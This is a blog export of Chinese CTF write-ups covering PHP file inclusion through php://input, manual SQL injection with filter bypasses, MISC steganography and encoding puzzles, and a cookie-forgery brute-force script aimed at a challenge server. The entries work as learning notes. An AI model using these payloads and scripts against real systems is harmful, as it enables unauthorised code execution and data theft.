<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>“百度杯”CTF比赛2017二月场include</title>
    <url>/2019/11/10/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B2017%E4%BA%8C%E6%9C%88%E5%9C%BAinclude/</url>
    <content><![CDATA[<img src="https://w.wallhaven.cc/full/6k/wallhaven-6kw5z6.jpg" alt="可能图床挂了" title="阴天">
关于文件include和php协议的学习
<a id="more"></a>

<hr>
<h4 id="00x0-分析题目"><a href="#00x0-分析题目" class="headerlink" title="00x0 分析题目"></a>00x0 分析题目</h4><p>题目直接给了代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if(isset($_REQUEST[&apos;path&apos;]))&#123;</span><br><span class="line">    include($_REQUEST[&apos;path&apos;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    include(&apos;phpinfo.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那就是根据参数path来读取文件，再查看phpinfo.php来看看有什么好利用的</p>
<h4 id="00x1-分析问题"><a href="#00x1-分析问题" class="headerlink" title="00x1 分析问题"></a>00x1 分析问题</h4><p>既然是文件包含的题，那就在phpinfo.php看看下面两个配置：<br><img src="https://upload-images.jianshu.io/upload_images/13192223-ef3239eebfc5eb1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>既然开着，那就直接用php协议</p>
<h4 id="00x2-查找文件"><a href="#00x2-查找文件" class="headerlink" title="00x2 查找文件"></a>00x2 查找文件</h4><p>构造url为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?path=php://input</span><br></pre></td></tr></table></figure>
<p>用火狐的插件RESTClient发送一个post包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo system(&apos;ls&apos;);?&gt;</span><br></pre></td></tr></table></figure>
<p>返回了<br><img src="https://upload-images.jianshu.io/upload_images/13192223-2390aef0209d57cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<h4 id="00x3-拿flag"><a href="#00x3-拿flag" class="headerlink" title="00x3 拿flag"></a>00x3 拿flag</h4><p>盲猜dle345aae.php又构造post包  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo system(&apos;cat dle345aae.php&apos;);?&gt;</span><br></pre></td></tr></table></figure>
<p>返回<br>$flag=”flag{1f5a8b55-0932-496c-af46-cf794127d7a3}”;</p>
<h4 id="00x4总结"><a href="#00x4总结" class="headerlink" title="00x4总结"></a>00x4总结</h4><p>通过本题深入了解了文件漏洞include和php协议的学习  </p>
<p>参考资料:<br><a href="https://www.k0rz3n.com/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/#1-allow-url-fopen-amp-allow-url-include" target="_blank" rel="noopener">phpinfo重要信息整理</a><br>PHP伪协议:<a href="https://www.cnblogs.com/So7cool/p/9795712.html" target="_blank" rel="noopener">https://www.cnblogs.com/So7cool/p/9795712.html</a><br>php协议官方文档：<a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.php.php</a>  </p>
<p><strong>本人能力有限，如文章中有错误或不当的地方，还请指正，联系邮箱:<a href="mailto:jarwu@qq.com" target="_blank" rel="noopener">jarwu@qq.com</a></strong></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>知识拓展</category>
      </categories>
      <tags>
        <tag>ctf题解</tag>
        <tag>web渗透</tag>
        <tag>include</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>“百度杯”CTF比赛九月场SQL</title>
    <url>/2019/11/10/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B%E4%B9%9D%E6%9C%88%E5%9C%BASQL/</url>
    <content><![CDATA[<img src="https://upload-images.jianshu.io/upload_images/13192223-95e77e48b6c401f2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="可能图床挂了" title="楼">
记录第一次sql手工注入，总结经验并拓展。
<a id="more"></a>

<hr>
<p>题目一来就告诉是个sql注入，并指出flag{在数据库中}</p>
<h4 id="00x0-尝试注入"><a href="#00x0-尝试注入" class="headerlink" title="00x0 尝试注入"></a>00x0 尝试注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos;</span><br><span class="line">无回显</span><br><span class="line"></span><br><span class="line">?id=1#&apos;</span><br><span class="line">有回显</span><br></pre></td></tr></table></figure>
<p>有回显的地方说明这是个注入点</p>
<h4 id="00x1-尝试猜当前表的字段数目"><a href="#00x1-尝试猜当前表的字段数目" class="headerlink" title="00x1 尝试猜当前表的字段数目"></a>00x1 尝试猜当前表的字段数目</h4><p>这里的1,2是盲猜是，不知道有多少个，先猜有2个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 union select 1,2</span><br><span class="line">返回：</span><br><span class="line">    inj code!</span><br></pre></td></tr></table></figure>
<p>说明有过滤关键字,使用注释符绕过试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 u/**/nion se/**/lect 1,2</span><br><span class="line">inj code!</span><br><span class="line"></span><br><span class="line">?id=1 u%00nion se%00lect 1,2</span><br><span class="line">没有回显</span><br></pre></td></tr></table></figure>
<p>没有回显，说明绕过成功，但可能数目不对，然后就试试3个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 u%00nion se%00lect 1,2,3</span><br><span class="line">返回：</span><br><span class="line">    flag&#123;在数据库中&#125;</span><br><span class="line">    2</span><br></pre></td></tr></table></figure>
<p>返回数据说明当前表有3个字段，且后台代码会返回2号字段的值（因为返回文本中显示的是2），所以就靠2号字段来操作数据库了</p>
<h4 id="00x2-查数据库名"><a href="#00x2-查数据库名" class="headerlink" title="00x2 查数据库名"></a>00x2 查数据库名</h4><p>先假设它用的mysql（因为很好快速搭建），所以先看看有没有这个information_schema数据库；<br>因为，一般来说,DBA是不会乱动这个数据库;<br>所以就随便查一查，看看哪些关键表有，哪些没有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 u%00nion se%00lect 1,SCHEMA_NAME,3 from information_schema.SCHEMATA</span><br><span class="line">返回：</span><br><span class="line">    flag&#123;在数据库中&#125;</span><br><span class="line">    information_schema</span><br><span class="line">    sqli</span><br></pre></td></tr></table></figure>
<p>这就很舒服了，有两张表（第一个不是表，是查id返回的字段值）,那flag肯定在sqli数据库中</p>
<h4 id="00x3-查表名"><a href="#00x3-查表名" class="headerlink" title="00x3 查表名"></a>00x3 查表名</h4><p>其实后面看别人的writeup时，才发现表名都直接写在网页源码里面了，不过还是来正常流程。<br>用information_schema数据库里的TABLES这张表来查表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 u%00nion se%00lect 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&quot;sqli&quot;</span><br><span class="line">返回：</span><br><span class="line">    flag&#123;在数据库中&#125;</span><br><span class="line">    info</span><br><span class="line">    users</span><br></pre></td></tr></table></figure>
<p>说明sqli数据库里面有两张表</p>
<h4 id="00x4-查字段名"><a href="#00x4-查字段名" class="headerlink" title="00x4 查字段名"></a>00x4 查字段名</h4><p>因为有两张表，所以查两次(注意写注释符)，再分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 u%00nion se%00lect 1,COLUMN_NAME,3 from information_schema.COLUMN where TABLE_SCHEMA=&quot;sqli&quot; a%00nd TABLE_NAME=&quot;users&quot;</span><br><span class="line">返回：</span><br><span class="line">    id</span><br><span class="line">    username</span><br><span class="line">    flag_9c861b688330</span><br><span class="line"></span><br><span class="line">?id=1 u%00nion se%00lect 1,COLUMN_NAME,3 from information_schema.COLUMN where TABLE_SCHEMA=&quot;sqli&quot; a%00nd TABLE_NAME=&quot;info&quot;</span><br><span class="line">返回:</span><br><span class="line">    id</span><br><span class="line">    title</span><br><span class="line">    flAg_T5ZNdrm</span><br></pre></td></tr></table></figure>
<p>这里拿到两个关键字段 flag_9c861b688330 和 flAg_T5ZNdrm</p>
<h4 id="00x5-查字段值"><a href="#00x5-查字段值" class="headerlink" title="00x5 查字段值"></a>00x5 查字段值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1 u%00nion se%00lect 1,flag_9c861b688330,3 from users</span><br><span class="line">啥都没返回，先不管</span><br><span class="line"></span><br><span class="line">?id=1 u%00nion se%00lect 1,flAg_T5ZNdrm,3 from info</span><br><span class="line">返回：</span><br><span class="line">    flag&#123;在数据库中&#125;</span><br><span class="line">    flag&#123;423b52b2-56a8-4212-9a1d-a312da63477d&#125;</span><br><span class="line">    test</span><br></pre></td></tr></table></figure>
<p>很明显了，提交<br>flag{423b52b2-56a8-4212-9a1d-a312da63477d}<br>成功!<br>至于users里面flag_9c861b688330，猜测可能是生成flag的种子，知道的大佬可以说一下</p>
<h4 id="00x6总结"><a href="#00x6总结" class="headerlink" title="00x6总结"></a>00x6总结</h4><p>通过本次手工注入（主要因为sqlmap扫不了，才手工的），了解了基本的手工注入流程，<br>information_schema数据库，注释符绕过的一些方法。</p>
<p>参考资料：<br>i春秋大佬们的writeup;<br>简书上的：<a href="https://www.jianshu.com/p/0a82851bb1c2" target="_blank" rel="noopener">https://www.jianshu.com/p/0a82851bb1c2</a><br>SQL注入绕过技巧：<a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a><br>information_schema技巧：<a href="https://zhuanlan.zhihu.com/p/22397455" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22397455</a>  </p>
<p><strong>本人能力有限，如文章中有错误或不当的地方，还请指正，联系邮箱:<a href="mailto:jarwu@qq.com" target="_blank" rel="noopener">jarwu@qq.com</a></strong></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>知识拓展</category>
      </categories>
      <tags>
        <tag>ctf题解</tag>
        <tag>web渗透</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>“百度杯”CTF比赛十一月场小可爱</title>
    <url>/2019/11/09/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B%E5%8D%81%E4%B8%80%E6%9C%88%E5%9C%BA%E5%B0%8F%E5%8F%AF%E7%88%B1/</url>
    <content><![CDATA[<img src="https://upload-images.jianshu.io/upload_images/13192223-65e5cc26bf27d44c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="可能图床挂了" title="棱">
最后拼二维码，还不得不学了会儿ps的抠图，拼完二维码，关键还扫不了，应该残缺的太厉害了，
二维码里的容错码都顶不住了。不过通过该题有学习了许多东西。
<a id="more"></a>

<hr>
<h4 id="00x0-分析题目"><a href="#00x0-分析题目" class="headerlink" title="00x0 分析题目"></a>00x0 分析题目</h4><p>题目直接说了<br>tips：txt文件内容即为密码<br>然后给了张图片，应该是图片隐写了文件。</p>
<h4 id="00x1-使用工具"><a href="#00x1-使用工具" class="headerlink" title="00x1 使用工具"></a>00x1 使用工具</h4><p>Binwalk是路由器固件分析的必备工具，该工具最大的优点就是可以自动完成指定文件的扫描，智能发掘潜藏在文件中所有可疑的文件类型及文件系统。</p>
<p>kali2019版本的环境下自带binwalk,使用binwalk + 文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk xxx.jpg</span><br></pre></td></tr></table></figure>

<p>然后就会看到,什么类型都显示出来了，就看到了zip文件类型。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/13192223-7938774ffcfe04dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="可能图床挂了"></p>
<p>linux下的dd指令可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。<br>主要记住：  </p>
<p>if=文件名：输入文件名，默认为标准输入。即指定源文件。<br>of=文件名：输出文件名，默认为标准输出。即指定目的文件。<br>bs=bytes：同时设置读入/输出的块大小为bytes个字节。<br>skip=blocks：从输入文件开头跳过blocks个块后再开始复制。<br>seek=blocks：从输出文件开头跳过blocks个块后再开始复制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if=xxx.jar of=flag.zip bs=1 skip=246614</span><br></pre></td></tr></table></figure>

<p>得到flag.zip，预览文件发现需要8位数字密码,这个简单，8*64种组合，电脑挂机一会儿跑一下就好了，<br>回到windows10上，使用Ziperello.exe直接破解，我是15秒就破解出来了。<br>密码是:<br>34878956</p>
<h4 id="00x2-拼图"><a href="#00x2-拼图" class="headerlink" title="00x2 拼图"></a>00x2 拼图</h4><p>打开图片还以为是flag，结果是二维码的碎片，身边没打印机，那就用ps抠图拼一下吧<br><img src="https://upload-images.jianshu.io/upload_images/13192223-ac4a2dbd62e83508.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/13192223-5ae7093c72c20997.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>不用扫了，残缺太厉害了，修复也不行，根本识别不了但是flag在writeup找到了，那位老哥是打印后拼的:<br>flag{e7df63cb-2786-4c2c-99f9-faeee4354359}  </p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf题解</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 第二届春秋欢乐赛ReCreators</title>
    <url>/2019/11/09/i%E6%98%A5%E7%A7%8B%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%98%A5%E7%A7%8B%E6%AC%A2%E4%B9%90%E8%B5%9BReCreators/</url>
    <content><![CDATA[<img src="https://upload-images.jianshu.io/upload_images/13192223-10eab99d814abce1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="可能图挂了" title="蓝天">
通过该题，学习了R-STUDIO的基本使用，base64，base32，base16编码原理，以及找到了几个好用的在线编码网站。
<a id="more"></a>

<hr>
<h3 id="00x0-R-STUDIO介绍"><a href="#00x0-R-STUDIO介绍" class="headerlink" title="00x0 R-STUDIO介绍"></a>00x0 R-STUDIO介绍</h3><p>R-Studio号称是损坏硬盘上资料的救星。该软件支持处理包括 FAT12/16/32/exFAT、<br>NTFS、NTFS5、HFS/HFS+、Little and Big Endian variants of UFS1/UFS2以及<br>Ext2/Ext3/Ext4 FS（Linux）等磁盘文件系统。计组和操作系统学了点的上手这软件基本够用。<br>以后数据恢复用R-Studio。<br>要区分RStudio，R语言的。</p>
<h3 id="00x1-base家族"><a href="#00x1-base家族" class="headerlink" title="00x1 base家族"></a>00x1 base家族</h3><p>参考<a href="https://zh.wikipedia.org/zh/Base64" target="_blank" rel="noopener">base64原理(中文维基)</a></p>
<p>拿base64举例，通俗地讲base64干的事情就是将文本按每3字节换4个编码字符，一组一组置换，最终把使用该编码的文本长度增加1/3，按这种一组一组的置换，实际情况中就会存在置换不了的情况，这个时候就看文本缺多少字节，就拿多少个“=”来填充</p>
<p><img src="https://upload-images.jianshu.io/upload_images/13192223-a335bab5f046db3b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/13192223-cb1156dd54b77e95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>其余base32,base16原理都是这样的  </p>
<p><strong>接下来是关键点，要记住</strong><br>字符范围是(填充符都是”=”):<br>base64:A-Z a-z 0-9 +/<br>base32:A-Z 2-7<br>base16:0-9 A-F</p>
<hr>
<p>接下来是该题目解题步骤  </p>
<h3 id="00x2-观察文件类型"><a href="#00x2-观察文件类型" class="headerlink" title="00x2 观察文件类型"></a>00x2 观察文件类型</h3><p>用R-STUDIO打开该文件，发现描述的是虚拟镜像文件，于是用该软件的打开镜像选项，找到该文件（在选择文件时，选择全部文件类型）<br><img src="https://upload-images.jianshu.io/upload_images/13192223-b3add12c9ae31a34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图床挂了">  </p>
<p>然后在打开的虚拟磁盘上，右键扫描，发现了其中的原始文件中有一个4.txt，观察其内容 ，应该是hex十六进制  </p>
<p><img src="https://upload-images.jianshu.io/upload_images/13192223-47aef62b6b54ff14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图床挂了">  </p>
<h3 id="00x3-解码"><a href="#00x3-解码" class="headerlink" title="00x3 解码"></a>00x3 解码</h3><p>然后就是漫长的解码过程了，梳理一下重头解码顺序，hex-&gt;hex-&gt;base32-&gt;base32-&gt;base32-&gt;base64-&gt;base64-&gt;hex-&gt;base32-&gt;base64-&gt;base64  </p>
<p>hex：<a href="https://www.rapidtables.com/convert/number/hex-to-ascii.html" target="_blank" rel="noopener">https://www.rapidtables.com/convert/number/hex-to-ascii.html</a><br>base64：<a href="https://base64.us/" target="_blank" rel="noopener">https://base64.us/</a><br>base32: <a href="https://www.qqxiuzi.cn/bianma/base.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/base.php</a>  </p>
<p>最后得:<br>flag{wh4t_a_w0nderfu1_d4y}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>知识拓展</category>
      </categories>
      <tags>
        <tag>ctf题解</tag>
        <tag>MISC</tag>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title>“百度杯”ctf比赛九月场Code</title>
    <url>/2019/11/07/%E4%B9%9D%E6%9C%88%E5%9C%BACode/</url>
    <content><![CDATA[<img src="https://upload-images.jianshu.io/upload_images/13192223-e20dd20ae06cbaa9.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="可能照片不在了" title="魔方" />
第一次遇到的难一点的综合题，做下总结
<a id="more"></a>

<hr>
<p>首先拿到题目  </p>
<p><a href="http://382fedb972594e01b19fcb24520a8de2006d171add81469f.changame.ichunqiu.com/index.php?jpg=hei.jpg" target="_blank" rel="noopener">http://382fedb972594e01b19fcb24520a8de2006d171add81469f.changame.ichunqiu.com/index.php?jpg=hei.jpg</a></p>
<h4 id="00x0"><a href="#00x0" class="headerlink" title="00x0"></a>00x0</h4><p>拿到url，打开发现只有一张图片,以为是图片隐写，用隐写工具打开，没发现什么特别的东西,先排除；  </p>
<h4 id="00x1"><a href="#00x1" class="headerlink" title="00x1"></a>00x1</h4><p>将图片的base64解码，解码不成功，先排除；</p>
<h4 id="00x2"><a href="#00x2" class="headerlink" title="00x2"></a>00x2</h4><p>观察url,将参数hei.jpg换成index.php,得到base64，解码得：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"></span><br><span class="line"> * Date: 2015/11/16</span><br><span class="line"></span><br><span class="line"> * Time: 1:31</span><br><span class="line"></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line"></span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line"></span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=hei.jpg&apos;);</span><br><span class="line"></span><br><span class="line">$file = $_GET[&apos;jpg&apos;];</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;title&gt;file:&apos;.$file.&apos;&lt;/title&gt;&apos;;</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line"></span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;_&quot;, $file);</span><br><span class="line"></span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>通过该代码，知道通过jpg带的参数，要通过正则匹配，选中除”a-zA-Z0-9.”的符号并替换为””，最后将’config’为替换为’_’</p>
<h4 id="00x3"><a href="#00x3" class="headerlink" title="00x3"></a>00x3</h4><p>在代码开始的注释地方发现异常点，”Created by PhpStorm”,通过长期JetBrains软件的使用，知道每次创建项目都会生成.idea，<br>在.idea目录下有个workspace.xml，该文件记录了大体的项目结构,试着访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/.idea/workspace.xml</span><br></pre></td></tr></table></figure>
<p>返回了一大串东西，观察发现了敏感词</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;entry file=&quot;file://$PROJECT_DIR$/fl3g_ichuqiu.php&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="00x4"><a href="#00x4" class="headerlink" title="00x4"></a>00x4</h4><p>试着访问该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/fl3g_ichuqiu.php</span><br></pre></td></tr></table></figure>
<p>返回了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╮(╯▽╰)╭</span><br></pre></td></tr></table></figure>
<h4 id="00x5"><a href="#00x5" class="headerlink" title="00x5"></a>00x5</h4><p>那试着作为参数访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/index.php?jpg=fl3g_ichuqiu.php</span><br></pre></td></tr></table></figure>
<p>返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:image/gif;base64,</span><br></pre></td></tr></table></figure>
<h4 id="00x6"><a href="#00x6" class="headerlink" title="00x6"></a>00x6</h4><p>回到第3步，分析一下,传入的fl3g_ichuqiu.php，其实最后是fl3gichuqiu.php，所以将“_”替换为”config”,访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/index.php?jpg=fl3gconfigichuqiu.php</span><br></pre></td></tr></table></figure>
<p>返回了一串base64，解码后得php代码：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">* Created by PhpStorm.</span><br><span class="line">* Date: 2015/11/16</span><br><span class="line">* Time: 1:31</span><br><span class="line">*/</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line">include(&apos;config.php&apos;);、</span><br><span class="line"></span><br><span class="line">// 生成长度为length的hash码</span><br><span class="line">function random($length, $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&apos;) &#123;</span><br><span class="line">   $hash = &apos;&apos;;</span><br><span class="line">   $max = strlen($chars) - 1;</span><br><span class="line">   for($i = 0; $i &lt; $length; $i++)	&#123;</span><br><span class="line">       $hash .= $chars[mt_rand(0, $max)];</span><br><span class="line">   &#125;</span><br><span class="line">   return $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 加密</span><br><span class="line">function encrypt($txt,$key)&#123;</span><br><span class="line">   // 将明文的每一项ASCII码+10（相当于凯撒密码）</span><br><span class="line">   for($i=0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">       $tmp .= chr(ord($txt[$i])+10);</span><br><span class="line">   &#125;</span><br><span class="line">   $txt = $tmp;</span><br><span class="line">   // 获取4位的hash码</span><br><span class="line">   $rnd=random(4);</span><br><span class="line">   // 将密钥加密</span><br><span class="line">   $key=md5($rnd.$key);</span><br><span class="line">   $s=0;</span><br><span class="line">   // 加密后的明文和加密后的密钥异或生成密文（注意是从key的第二位开始异或，key的第一位为无效位）</span><br><span class="line">   for($i=0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">       if($s == 32) $s = 0;</span><br><span class="line">       $ttmp .= $txt[$i] ^ $key[++$s];</span><br><span class="line">   &#125;</span><br><span class="line">   // 返回由base64加密的4位hash码与密文的拼接</span><br><span class="line">   return base64_encode($rnd.$ttmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 解密</span><br><span class="line">function decrypt($txt,$key)&#123;</span><br><span class="line">   // 先解base64</span><br><span class="line">   $txt=base64_decode($txt);</span><br><span class="line">   // 截取hash码</span><br><span class="line">   $rnd = substr($txt,0,4);</span><br><span class="line">   // 截取密文</span><br><span class="line">   $txt = substr($txt,4);</span><br><span class="line">   // 加密密钥（还原加密过程的密钥）</span><br><span class="line">   $key=md5($rnd.$key);</span><br><span class="line">   // 做异或得ASCII偏移后的密文</span><br><span class="line">   $s=0;</span><br><span class="line">   for($i=0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">       if($s == 32) $s = 0;</span><br><span class="line">       $tmp .= $txt[$i]^$key[++$s];</span><br><span class="line">   &#125;</span><br><span class="line">   // ASCII-10明文</span><br><span class="line">   for($i=0;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">       $tmp1 .= chr(ord($tmp[$i])-10);</span><br><span class="line">   &#125;</span><br><span class="line">   return $tmp1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 如果传入参数解密后是system就输出flag</span><br><span class="line">$username = decrypt($_COOKIE[&apos;user&apos;],$key);</span><br><span class="line">if ($username == &apos;system&apos;)&#123;</span><br><span class="line">   echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">// 否则设置固定的cookie </span><br><span class="line">// &quot;user&quot;:&quot;encrypt(&apos;guest&apos;,$key)&quot;</span><br><span class="line"></span><br><span class="line">   // 可以看出,给出了加密后的base64码，明文guest，但是密钥未知</span><br><span class="line">   setcookie(&apos;user&apos;,encrypt(&apos;guest&apos;,$key));</span><br><span class="line">   echo &quot;╮(╯▽╰)╭&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>由解密函数可知，当明文为5位的guest时，只需要用到密钥的从第2位开始的后5位进行异或运算，<br>就可以解出6位的密钥，而另一个明文system是6位的，所以关键是要求出7位的密钥。通过每次设定cookies值，来爆破出flag。</p>
<h4 id="00x7"><a href="#00x7" class="headerlink" title="00x7"></a>00x7</h4><p>php代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$encryptStr=base64_decode(&quot;ZjdOSBRGVk5M&quot;);</span><br><span class="line">$rnd=substr($encryptStr,0,4);</span><br><span class="line">//echo $encryptStr.&quot;&lt;br \&gt;&quot;;</span><br><span class="line">$dttmp=substr($encryptStr,4);</span><br><span class="line">$txt=&quot;guest&quot;;</span><br><span class="line">$tmp=&quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">  $tmp .= chr(ord($txt[$i])+10);</span><br><span class="line">&#125;</span><br><span class="line">//echo $tmp.&quot;&lt;br \&gt;&quot;;</span><br><span class="line">$txt = $tmp;</span><br><span class="line">$key=&quot;1&quot;;</span><br><span class="line">for($i=0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line"> $key.=$txt[$i]^$dttmp[$i];</span><br><span class="line">&#125;</span><br><span class="line">//echo $key.&quot;&lt;br \&gt;&quot;;</span><br><span class="line">$txt=&quot;system&quot;;</span><br><span class="line">$tmp=&quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">  $tmp .= chr(ord($txt[$i])+10);</span><br><span class="line">&#125;</span><br><span class="line">//echo $tmp.&quot;&lt;br \&gt;&quot;;</span><br><span class="line">$txt=$tmp;</span><br><span class="line">$dic=&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;;</span><br><span class="line">for($i=0;$i&lt;strlen($dic);$i++)&#123;</span><br><span class="line">  $tempKey=$key.$dic[$i];</span><br><span class="line">  $s=0;</span><br><span class="line">  $ttmp=&quot;&quot;;</span><br><span class="line">  for($j=0;$j&lt;strlen($txt);$j++)&#123;</span><br><span class="line">   ++$s;</span><br><span class="line">      $ttmp .= ($txt[$j] ^ $tempKey[$s]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  //echo $rnd.$ttmp.&quot;&lt;br \&gt;&quot;;</span><br><span class="line">  //echo base64_encode($rnd.$ttmp).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">  $ch=curl_init(&quot;http://382fedb972594e01b19fcb24520a8de2006d171add81469f.changame.ichunqiu.com/fl3g_ichuqiu.php&quot;);</span><br><span class="line">  curl_setopt($ch,CURLOPT_COOKIE,&quot;user=&quot;.base64_encode($rnd.$ttmp));</span><br><span class="line">  $output=curl_exec($ch);</span><br><span class="line">  echo $output.&quot;user=&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>本来是写的python3的代码来爆破，但是有问题,经过一番调试查资料，找到了原因，php的chr()和python3的chr()不同，php的chr()会表示0-255的字符，有点类似utf-8，python3的chr()返回的就是Unicode码编码，0-127用的一字节，超过127的会增加字节，具体可以看<a href="https://zh.wikipedia.org/wiki/UTF-8#UTF-8%E7%9A%84%E7%89%B9%E6%80%A7" target="_blank" rel="noopener">维基百科(要梯子)</a>的解释.  </p>
